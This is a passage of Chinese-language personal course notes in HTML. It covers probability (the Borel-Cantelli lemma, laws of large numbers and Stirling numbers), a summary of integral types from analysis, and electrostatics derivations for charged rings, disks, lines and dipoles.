<p>这一部分的推导比较繁琐,这里就不敲上来了,直接附上我的手写版,勿怪</p>
<figure>
<img alt="几乎处处收敛的判别法则" src="../NOTE/Probability/handw.jpg" />

<figcaption>对于式子的理解</figcaption>
</figure>
<h3 id="note-probability-fourth-borel-cantelli">Borel-Cantelli 引理<a class="headerlink" href="#note-probability-fourth-borel-cantelli" title="Permanent link">&para;</a></h3>
<ul>
<li>假设 <span class="arithmatex">\(A_n, n \geqslant 1\)</span> 是一列事件，如果</li>
</ul>
<div class="arithmatex">\[
\sum_{n=1}^{\infty} P(A_n) &lt; \infty
\]</div>
<p>那么</p>
<div class="arithmatex">\[
P(A_n, i.o.) = 0
\]</div>
<p>证明：</p>
<div class="arithmatex">\[
P(A_n, i.o.) =P(\bigcap_{N=1}^{\infty} \bigcup_{n=N}^{\infty} A_n) =\lim_{N \to \infty} P\left(\bigcup_{n=N}^{\infty} A_n\right)(\text{连续性})
\]</div>
<div class="arithmatex">\[
P\left(\bigcup_{n=N}^{\infty} A_n\right) \leqslant \sum_{n=N}^{\infty} P(A_n) \to 0(\text{次可加性加Cauchy收敛})
\]</div>
<ul>
<li>假设 <span class="arithmatex">\(A_n, n \geqslant 1\)</span> 是一列独立事件，如果</li>
</ul>
<div class="arithmatex">\[
\sum_{n=1}^{\infty} P(A_n) = \infty
\]</div>
<p>那么</p>
<div class="arithmatex">\[
P(A_n, i.o.) = 1
\]</div>
<p>证明：由于 <span class="arithmatex">\(A_n, n \geqslant 1\)</span> 是一列独立事件，那么</p>
<p>首先做如下转化</p>
<div class="arithmatex">\[
P(A_n, i.o.) = P\left(\bigcap_{k=1}^{\infty} \bigcup_{n=k}^{\infty} A_n\right) = 1
\]</div>
<div class="arithmatex">\[
\iff \lim_{k \to \infty} P\left(\bigcup_{n=k}^{\infty} A_n\right) = 1
\]</div>
<div class="arithmatex">\[
\iff P\left(\bigcup_{n=k}^{\infty} A_n\right) = 1, \forall k \geqslant 1 \quad (\text{单调递减趋于1，只能为1})
\]</div>
<div class="arithmatex">\[
\iff P\left(\bigcap_{n=k}^{\infty} A_n^c\right) = 0, \forall k \geqslant 1. \quad (\text{de Morgan})
\]</div>
<div class="arithmatex">\[
P\left(\bigcap_{n=N}^{M} A_n^c\right) = \prod_{n=N}^{M} P(A_n^c) = \prod_{n=N}^{M} (1 - P(A_n))
\]</div>
<div class="arithmatex">\[
\leqslant \prod_{n=N}^{M} e^{-P(A_n)} = e^{-\sum_{n=N}^{M} P(A_n)}
\]</div>
<div class="arithmatex">\[
\lim_{N \to \infty} \lim_{M \to \infty} P\left(\bigcap_{n=N}^{M} A_n^c\right) = 0
\]</div>
<p>Borel-Cantelli 引理又称为零一定律，即如果事件发生的概率之和有限，那么事件发生的次数是有限的(有无限次不发生)，如果事件发生的概率之和无限，那么事件发生的次数是无限的。</p>
<h3 id="note-probability-fourth-borel">Borel大数定律<a class="headerlink" href="#note-probability-fourth-borel" title="Permanent link">&para;</a></h3>
<p>假设 <span class="arithmatex">\((\Omega, A, P)\)</span> 是一个概率空间，<span class="arithmatex">\(\xi_k, k \geqslant 1\)</span> 是一列独立同分布随机变量：</p>
<div class="arithmatex">\[ 
P(\xi_k = 1) = p, \quad P(\xi_k = 0) = 1 - p 
\]</div>
<p>记 <span class="arithmatex">\(S_n = \sum_{k=1}^{n} \xi_k\)</span>，那么 <span class="arithmatex">\(S_n/n \to p\)</span>，a.s.</p>
<p>证明：对任意 <span class="arithmatex">\(\epsilon &gt; 0\)</span></p>
<div class="arithmatex">\[ 
P\left(\left|\frac{S_n}{n} - p\right| &gt; \epsilon, i.o.\right) = 0 
\]</div>
<p>由 Borel-Cantelli 引理，只需证明</p>
<div class="arithmatex">\[
\sum_{n=1}^{\infty} P\left(\left|\frac{S_n}{n} - p\right| &gt; \epsilon\right) &lt; \infty
\]</div>
<p>由 Markov 不等式，</p>
<div class="arithmatex">\[
P\left(\left|\frac{S_n}{n} - p\right| &gt; \epsilon\right) \leqslant \frac{E|S_n - np|^4}{n^4 \epsilon^4}
\]</div>
<p>容易计算得，</p>
<div class="arithmatex">\[
E|S_n - np|^4 = np(1-p)[(1-p)^3 + (1-p)^2] + n(n-1)p^2(1-p)^2
\]</div>
<p>因此，</p>
<div class="arithmatex">\[
\sum_{n=1}^{\infty} P\left(\left|\frac{S_n}{n} - p\right| &gt; \epsilon\right) \leqslant K(\epsilon, p) \sum_{n=1}^{\infty} \frac{1}{n^2} &lt; \infty
\]</div>
<h3 id="note-probability-fourth-kolmogorov">Kolmogorov 大数律<a class="headerlink" href="#note-probability-fourth-kolmogorov" title="Permanent link">&para;</a></h3>
<p>假设 <span class="arithmatex">\((\Omega, A, P)\)</span> 是一个概率空间，<span class="arithmatex">\(\xi_k, k \geqslant 1\)</span> 是一列独立同分布随机变量。如果 <span class="arithmatex">\(E\xi_k = \mu\)</span>，那么</p>
<div class="arithmatex">\[
\frac{S_n}{n} \to \mu, \quad a.s.
\]</div>
<ol>
<li>Kolmogorov 强大数律推广了 Borel 强大数律</li>
<li>Kolmogorov 强大数律推广了 Khinchine 大数律</li>
</ol></section><section class="print-page" id="note-probability-others" heading-number="2.3.2.6"><h1 id="note-probability-others-_1">概率相关的知识<a class="headerlink" href="#note-probability-others-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 443 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 2 分钟</p>
</div>
<blockquote>
<p>记录一些学习过程中发现的有趣的概率问题</p>
</blockquote>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p>相互独立，交事件可以拆开变成概率相乘；
且若AB独立，则A与B的补事件也独立</p>
<div class="arithmatex">\[
    P(A \cap B) = P(A) \cdot P(B)
\]</div>
<p>互不相交(互斥)，并事件可以拆开变成概率相加。</p>
<div class="arithmatex">\[
    P(A \cup B) = P(A) + P(B)
\]</div>
</div>
<div class="admonition question">
<p class="admonition-title">n 个球放入m个不同的盒子</p>
</div>
<table>
<thead>
<tr>
<th>球</th>
<th>盒</th>
<th>允许空</th>
<th>方案数</th>
</tr>
</thead>
<tbody>
<tr>
<td>不同</td>
<td>不同</td>
<td>是</td>
<td><span class="arithmatex">\( m^n \)</span></td>
</tr>
<tr>
<td>不同</td>
<td>不同</td>
<td>否</td>
<td><span class="arithmatex">\( m! \cdot S(n, m) \)</span></td>
</tr>
<tr>
<td>不同</td>
<td>相同</td>
<td>是</td>
<td><span class="arithmatex">\(\sum_{k=0}^{m} S(n, k)\)</span></td>
</tr>
<tr>
<td>不同</td>
<td>相同</td>
<td>否</td>
<td><span class="arithmatex">\( S(n, m) \)</span></td>
</tr>
<tr>
<td>相同</td>
<td>不同</td>
<td>是</td>
<td><span class="arithmatex">\( \binom{n+m-1}{m-1} \)</span></td>
</tr>
<tr>
<td>相同</td>
<td>不同</td>
<td>否</td>
<td><span class="arithmatex">\( \binom{n-1}{m-1} \)</span></td>
</tr>
<tr>
<td>相同</td>
<td>相同</td>
<td>是</td>
<td><span class="arithmatex">\( dp(n, m) \)</span></td>
</tr>
<tr>
<td>相同</td>
<td>相同</td>
<td>否</td>
<td><span class="arithmatex">\( dp(n-m, m) \)</span></td>
</tr>
</tbody>
</table>
<p>其中 <span class="arithmatex">\(S(n,m)\)</span> 为第二类 Stirling 数（Stirling numbers of the second kind）是组合数学中的一个重要概念，用来描述如何将 <span class="arithmatex">\(n\)</span> 个不同的元素划分为 <span class="arithmatex">\(m\)</span> 个非空的无序子集。更具体地说，<span class="arithmatex">\( S(n, m) \)</span> 表示的是有多少种方法可以把一个包含 <span class="arithmatex">\(n\)</span> 个元素的集合划分成 <span class="arithmatex">\(m\)</span> 个非空子集。</p>
<p><strong>计算公式</strong></p>
<p>第二类斯特林数 <span class="arithmatex">\( S(n, m) \)</span> 的递推公式如下：</p>
<div class="arithmatex">\[
S(n, m) = m \cdot S(n-1, m) + S(n-1, m-1)
\]</div>
<p>其中，边界条件是：</p>
<ul>
<li><span class="arithmatex">\( S(0, 0) = 1 \)</span></li>
<li>
<p>对于 <span class="arithmatex">\( n &gt; 0 \)</span>， <span class="arithmatex">\( S(n, 0) = 0 \)</span> 且 <span class="arithmatex">\( S(n, n) = 1 \)</span></p>
</li>
<li>
<p><span class="arithmatex">\( m \cdot S(n-1, m) \)</span>：将第 <span class="arithmatex">\(n\)</span> 个元素放入现有的 <span class="arithmatex">\(m\)</span> 个子集中的某一个。共有<span class="arithmatex">\(m \cdot S(n-1, m)\)</span>种 。</p>
</li>
<li><span class="arithmatex">\( S(n-1, m-1) \)</span>：将第 <span class="arithmatex">\(n\)</span> 个元素作为一个新的子集。</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>例如，<span class="arithmatex">\( S(3, 2) = 3 \)</span>，表示有 3 种方法可以将 3 个元素分成 2 个非空子集，分别是：</p>
<ul>
<li>{1, 2}, {3}</li>
<li>{1, 3}, {2}</li>
<li>{2, 3}, {1}</li>
</ul>
</div>
<h2 id="note-probability-others-stirling">Stirling 公式<a class="headerlink" href="#note-probability-others-stirling" title="Permanent link">&para;</a></h2>
<div class="arithmatex">\[
    n! \approx \sqrt{2\pi n} \left( \frac{n}{e} \right)^n
\]</div></section></section>
                    <section class='print-page md-section' id='section-2-3-3' heading-number='2.3.3'>
                        <h1>数学分析<a class='headerlink' href='#section-2-3-3' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-ma" heading-number="2.3.3.1"><h1 id="note-ma-_1">数学分析一，二的个人手写笔记<a class="headerlink" href="#note-ma-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 392 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 2 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 1 分钟</p>
</div>
<div class="card file-block">
<div class="file-icon"><img src="../NOTE/MA/pdf.svg" style="height: 3em;"></div>
<div class="file-body">
<div class="file-title">数学分析（甲）Ⅰ（H）笔记</div>
<div class="file-meta"></div>
</div>
<p><a class="down-button" target="_blank" href="../NOTE/MA/math1.pdf"  markdown="1"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M288 32c0-17.7-14.3-32-32-32s-32 14.3-32 32v242.7l-73.4-73.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l128 128c12.5 12.5 32.8 12.5 45.3 0l128-128c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L288 274.7zM64 352c-35.3 0-64 28.7-64 64v32c0 35.3 28.7 64 64 64h384c35.3 0 64-28.7 64-64v-32c0-35.3-28.7-64-64-64H346.5l-45.3 45.3c-25 25-65.5 25-90.5 0L165.5 352zm368 56a24 24 0 1 1 0 48 24 24 0 1 1 0-48"/></svg></span> 查看</a></p>
</div>
<!-- <div class="card file-block" markdown="1">
<div class="file-icon"><img src="https://raw.githubusercontent.com/kailqq/cdn_img/master/img/pdf.svg" style="height: 3em;"></div>
<div class="file-body">
<div class="file-title">数学分析（甲）Ⅱ（H）笔记</div>
<div class="file-meta"> </div>
</div>
<a class="down-button" target="_blank" href="../NOTE/MA/math2.pdf" markdown="1">:fontawesome-solid-download: 查看</a>
</div> -->

<div class="admonition idea">
<p class="admonition-title">各类积分的总结</p>
<ul>
<li>定义在整个空间上的积分</li>
<li>定积分</li>
<li>双重积分</li>
<li>三重积分</li>
<li>定义在曲线上的积分</li>
<li>曲线积分<ul>
<li>第一类曲线积分，计算可以使用参数方程，将曲线微分表示出来即可</li>
<li>第二类曲线积分，计算可以使用参数方程，将曲线微分表示出来，但是要根据方向来确定积分上下限；也可以使用Green公式和Stokes公式，将边界曲线积分转化为所围成曲面上的第一类面积分</li>
</ul>
</li>
<li>曲面积分<ul>
<li>第一类曲面积分，计算可以通过投影,通过计算法向量来计算投影角；从而将曲面积分转化为二重积分</li>
<li>第二类曲面积分，计算可以通过投影,通过计算法向量来计算投影角；从而将曲面积分转化为二重积分，在这个基础之上多了一步定向即 <strong>一投，二代，三定向</strong> ；也可以使用Gauss公式，将曲面积分转化为所围成体积上的体积分</li>
</ul>
</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Gauss,Green,Stokes公式</p>
<ul>
<li>Gauss公式：<span class="arithmatex">\(\iint_S \vec{F}\cdot d\vec{S} = \iiint_V \nabla \cdot \vec{F}dV\)</span></li>
<li>Green公式：<span class="arithmatex">\(\oint_C Pdx + Qdy = \iint_D (\frac{\partial Q}{\partial x} - \frac{\partial P}{\partial y})dxdy\)</span></li>
<li>Stokes公式：<span class="arithmatex">\(\oint_C \vec{F}\cdot d\vec{r} = \iint_S \nabla \times \vec{F}\cdot d\vec{S}\)</span>
实际上Green公式是Stokes公式在二维平面上的一个特例</li>
</ul>
</div>
</div></section></section>
                    <section class='print-page md-section' id='section-2-3-4' heading-number='2.3.4'>
                        <h1>普通物理学二<a class='headerlink' href='#section-2-3-4' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-physics" heading-number="2.3.4.1"><note-physics-h1 id="note-physics-h">普通物理学二(H)<a class="headerlink" href="#note-physics-h" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 95 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<blockquote>
<p>授课教师：<a href="https://person.zju.edu.cn/0092420">方明虎</a></p>
</blockquote>
<p>一位科研和教学水平都很高的老师！讲课充满激情，可以在课堂上了解到所学知识与前沿科学，实际生活的联系，根本不会犯困，体验极佳</p>
<div class="toc-container">
    <div class="toc-header">目录</div>
    <ul class="toc">
        <li><a href="#note-physics-eletronic">静电学</a></li>
        <li><a href="#note-physics-magnetism">恒定磁学</a></li>
        <li><a href="#note-physics-electrodynamincs">电动力学</a></li>
        <li><a href="#note-physics-maxwell">麦克斯韦方程</a></li>
        <li><a href="#note-physics-light">光学</a></li>
        <li><a href="#note-physics-quantum">量子力学</a></li>
    </ul>

</div></section><section class="print-page" id="note-physics-eletronic" heading-number="2.3.4.2"><h1 id="note-physics-eletronic-_1">电学部分<a class="headerlink" href="#note-physics-eletronic-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 5706 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 25 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 20 分钟</p>
</div>
<h2 id="note-physics-eletronic-electric-charge-and-coulombs-law">Electric Charge and Coulomb's Law(电荷和库仑定律)<a class="headerlink" href="#note-physics-eletronic-electric-charge-and-coulombs-law" title="Permanent link">&para;</a></h2>
<h3 id="note-physics-eletronic-a-ring-of-charge">A ring of charge<a class="headerlink" href="#note-physics-eletronic-a-ring-of-charge" title="Permanent link">&para;</a></h3>
<p>对于一个均匀带电的圆环，距离其中心 <span class="arithmatex">\(z\)</span> 的带电量为 <span class="arithmatex">\(q_0\)</span> 所受的沿 <span class="arithmatex">\(Z\)</span> 方向的力 <span class="arithmatex">\(F_z\)</span> </p>
<div align=center><img src="../NOTE/Physics/img/part1/1.png" width=55%/></div>

<p>先计算电荷密度</p>
<div class="arithmatex">\[
\lambda = \frac{q}{2 \pi R}
\]</div>
<div class="arithmatex">\[
dF = \frac{1}{4 \pi \epsilon_0} \frac{q_0 dq}{r^2} = \frac{1}{4 \pi \epsilon_0} \frac{q_0 \lambda Rd\phi}{(z^2 + R^2)}
\]</div>
<div class="arithmatex">\[
F_z = \int dF_z = \int dF \cos \theta = \int \frac{q_0 \lambda Rd\phi}{4 \pi \epsilon_0 (z^2 + R^2)} \frac{z}{\sqrt{z^2 + R^2}}
\]</div>
<div class="arithmatex">\[
= \frac{1}{4 \pi \epsilon_0} \int_0^{2\pi} \frac{q_0 \lambda Rz}{(z^2 + R^2)^{3/2}} d\phi
\]</div>
<div class="arithmatex">\[
= \frac{1}{4 \pi \epsilon_0} \cdot \frac{q_0 q z}{(z^2 + R^2)^{3/2}} \bigg|_0^{2\pi}
\]</div>
<div class="arithmatex">\[
= \frac{1}{4 \pi \epsilon_0} \cdot \frac{q_0 q z}{(z^2 + R^2)^{3/2}}
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>当 <span class="arithmatex">\(z\)</span> 非常大,原式子就退化成了两个点电荷之间的相互作用</p>
<div class="arithmatex">\[
  z \to +\infty, F_z \to \frac{1}{4 \pi \epsilon_0} \dfrac{q_0q}{z^2}
\]</div>
</div>
<h3 id="note-physics-eletronic-a-disk-of-charge">A disk of charge<a class="headerlink" href="#note-physics-eletronic-a-disk-of-charge" title="Permanent link">&para;</a></h3>
<p>如果是一个圆盘，<span class="arithmatex">\(F_z\)</span> 可以用圆环来逼近</p>
<div align=center><img src="../NOTE/Physics/img/part1/2.png" width=55%/></div>

<div class="arithmatex">\[
\sigma = \frac{q}{\pi R^2}
\]</div>
<div class="arithmatex">\[
dq = \sigma dA = \sigma(2 \pi \omega d\omega) = 2 \pi \sigma \omega d\omega
\]</div>
<div class="arithmatex">\[
dF_z = \frac{1}{4 \pi \epsilon_0} \frac{q_0 (2 \pi \sigma \omega d\omega) z}{(z^2 + \omega^2)^{3/2}}
\]</div>
<div class="arithmatex">\[
F_z = \frac{1}{4 \pi \epsilon_0} q_0 2 \pi \sigma z \int_0^{R} \frac{\omega d\omega}{(z^2 + \omega^2)^{3/2}}
\]</div>
<div class="arithmatex">\[
= \frac{1}{4 \pi \epsilon_0} \cdot \frac{2 q_0 q}{R^2} \left( 1 - \frac{z}{\sqrt{z^2 + R^2}} \right)
\]</div>
<p>当 <span class="arithmatex">\(z\)</span> 非常大,原式子就退化成了两个点电荷之间的相互作用(用Taylor展开分析)</p>
<div class="arithmatex">\[ z \to +\infty, F_z \to \frac{1}{4 \pi \epsilon_0} \dfrac{q_0q}{z^2} \]</div>
<div class="arithmatex">\[
  \left( 1 - \frac{z}{\sqrt{z^2 + R^2}} \right) \to \left( 1- (1+\frac{R^{2}}{z^{2}})^{-\frac{1}{2}} \right) = \frac{R^{2}}{2z^{2}}
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>如果是一个无穷大的圆盘，那么<span class="arithmatex">\(R \to \infty\)</span>,此时
<span class="arithmatex">\(F_z = \dfrac{1}{4 \pi \epsilon_0} \dfrac{2q_0q}{R^2}\)</span>
其电场为</p>
<div class="arithmatex">\[
E_z = \frac{\sigma}{2 \varepsilon_0}
\]</div>
</div>
<p><strong>A infinite stick of charge</strong></p>
<div align=center><img src="../NOTE/Physics/img/part1/3.png" width=55%/></div>

<p>由于对称性，在<span class="arithmatex">\(x\)</span>方向上没有电场</p>
<div class="arithmatex">\[
\begin{align*}
  dq &amp;= \lambda dx = \lambda d(r \tan \theta) = \lambda r \sec^2 \theta d\theta \\
  dE_y &amp;= dE \cos \theta= \frac{1}{4 \pi \varepsilon_0} \frac{dq}{r'^2} \cos \theta \\
  &amp;= \frac{1}{4 \pi \varepsilon_0} \frac{\lambda r\cos^2 \theta \sec^2 \theta d\theta}{r^2} \cos \theta \\
  &amp;= \frac{1}{4 \pi \varepsilon_0} \frac{\lambda \cos \theta d\theta}{r}\\
  E_y &amp;= \int_{-\frac{\pi}{2}}^{\frac{\pi}{2}} dE_y = \int_{-\frac{\pi}{2}}^{\frac{\pi}{2}} \frac{1}{4 \pi \varepsilon_0} \frac{\lambda \cos \theta d\theta}{r} \\
  &amp;= \dfrac{\lambda}{2 \pi \varepsilon_0 r} \
\end{align*}
\]</div>
<h3 id="note-physics-eletronic-dipole">Dipole(电偶极矩)<a class="headerlink" href="#note-physics-eletronic-dipole" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>电偶极矩是描述带电粒子系统中电荷分布的物理量，通常用于量化两个相反电荷之间的分离程度和方向。在经典电磁学中，电偶极矩通常表示为一个矢量，其大小等于电荷量乘以电荷间的距离。
定义为：</p>
<div class="arithmatex">\[
\boldsymbol{p} = q \cdot \boldsymbol{d}
\]</div>
<p>其中：</p>
<ul>
<li><span class="arithmatex">\( q \)</span> 是两个相反电荷的电荷量，</li>
<li><span class="arithmatex">\( \mathbf{d} \)</span> 是从负电荷指向正电荷的矢量，表示两个电荷之间的距离。</li>
</ul>
<p>电偶极矩的方向从负电荷指向正电荷，因此在分子或原子系统中，它反映了电荷不对称分布的程度。对于分子，电偶极矩的大小和方向对分子的化学性质和反应性有重要影响。</p>
<p>电偶极矩的单位通常是德拜（Debye，符号为 D），1 德拜大约等于 <span class="arithmatex">\( 3.33564 \times 10^{-30} \)</span> 库仑·米。</p>
</div>
<p>根据电偶极矩可以将分子间作用力分为几种类型</p>
<div align=center><img src="../NOTE/Physics/img/part1/4.png" width=55%/></div>

<ul>
<li><strong>离子-偶极相互作用（Ion-Dipole Interaction）</strong></li>
</ul>
<p>离子-偶极相互作用发生在带电的离子和极性分子之间。当离子（如 <span class="arithmatex">\( \text{Na}^+ \)</span> 或 <span class="arithmatex">\( \text{Cl}^- \)</span>）靠近一个有电偶极矩的分子（如水分子，H<span class="arithmatex">\(_2\)</span>O）时，离子会与极性分子的部分正电荷或负电荷产生吸引力。</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>在盐溶解于水的过程中，水分子的极性部分（氧的负电部分或氢的正电部分）与钠离子或氯离子之间产生的吸引力是离子-偶极相互作用。这种相互作用有助于溶解过程。</p>
</div>
<ul>
<li><strong>偶极-偶极相互作用（Dipole-Dipole Interaction）</strong></li>
</ul>
<p>偶极-偶极相互作用发生在两个极性分子之间，这些分子都有永久的偶极矩。当一个分子的正电部分接近另一个分子的负电部分时，它们之间会产生吸引力。</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>像氯化氢 (HCl) 这样的极性分子之间的相互作用就属于偶极-偶极相互作用。HCl 分子的氯原子带负电，而氢原子带正电，这两种相反的电荷相互吸引，从而形成偶极-偶极相互作用。</p>
</div>
<ul>
<li><strong>伦敦色散力（London Dispersion Force）</strong></li>
</ul>
<p>伦敦色散力，又称为**瞬时偶极-诱导偶极力**，是一种在所有原子和分子之间都存在的弱相互作用力，特别是对于非极性分子。它是由瞬时的电子运动引起的，即在某个瞬间，分子或原子周围的电子云分布不均匀，形成瞬时偶极，这个瞬时偶极会诱导临近分子或原子产生相似的瞬时偶极，从而产生吸引力。</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>即使是像氮气 (N<span class="arithmatex">\(_2\)</span>) 和氧气 (O<span class="arithmatex">\(_2\)</span>) 这样的非极性分子，也存在伦敦色散力。这种相互作用虽然很弱，但对大多数非极性物质的凝聚力和熔沸点有重要影响。</p>
</div>
<h4 id="note-physics-eletronic-_2">电偶极矩产生的电场<a class="headerlink" href="#note-physics-eletronic-_2" title="Permanent link">&para;</a></h4>
<div align=center><img src="../NOTE/Physics/img/part1/5.png" width=45%/></div>

<div class="arithmatex">\[
  E_x(x,0)=0(symmetry)
\]</div>
<div class="arithmatex">\[
E_y(x,0) = -2 \cdot \frac{1}{4 \pi \varepsilon_0} \cdot \frac{Q}{r^2} \sin \theta
\]</div>
<div class="arithmatex">\[
\sin \theta = \frac{a}{r}, \quad r^2 = x^2 + a^2
\]</div>
<div class="arithmatex">\[
E_y(x,0) = -2 \cdot \frac{1}{4 \pi \varepsilon_0} \cdot \frac{Qa}{(x^2 + a^2)^{3/2}}
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<div class="arithmatex">\[
for \ r&gt;&gt;a  \\
E_y(r,0) = -2 \cdot \frac{1}{4 \pi \varepsilon_0} \cdot \frac{Qa}{r^3}
\]</div>
</div>
<p>如果考虑 <span class="arithmatex">\((0,y)\)</span> 上的电场，则其在 <span class="arithmatex">\(x\)</span> 方向上没有分量</p>
<div class="arithmatex">\[
  E_x(0,y)=0
\]</div>
<div class="arithmatex">\[
\begin{align*}
E_y(0,y) &amp;= \frac{Q}{4 \pi \varepsilon_0} \cdot \left(\frac{1}{(y-a)^2}-\frac{1}{(y+a)^2}\right)\\
         &amp;= \frac{Q}{4 \pi \varepsilon_0} \cdot \dfrac{4ay}{y^4(1-\frac{a^2}{y^2})^2}
\end{align*}
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<div class="arithmatex">\[
for \ r&gt;&gt;a  \\
E_y(0,r) = 4 \cdot \frac{1}{4 \pi \varepsilon_0} \cdot \frac{Qa}{r^3}
\]</div>
</div>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>北高峰上的天线和紫金港的分子</p>
<p><span class="arithmatex">\(E\)</span> 和 <span class="arithmatex">\(r^3\)</span> 成反比 </p>
</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>电偶极矩的电场与距离<span class="arithmatex">\(r^3\)</span>成反比，而点电荷的电场与距离<span class="arithmatex">\(r^2\)</span>成反比，无穷长导线的电场与距离<span class="arithmatex">\(r\)</span>成反比</p>
</div>
<h4 id="note-physics-eletronic-_3">电偶极矩在电场中<a class="headerlink" href="#note-physics-eletronic-_3" title="Permanent link">&para;</a></h4>
<div align=center><img src="../NOTE/Physics/img/part1/6.png" width=55%/></div>

<div class="arithmatex">\[
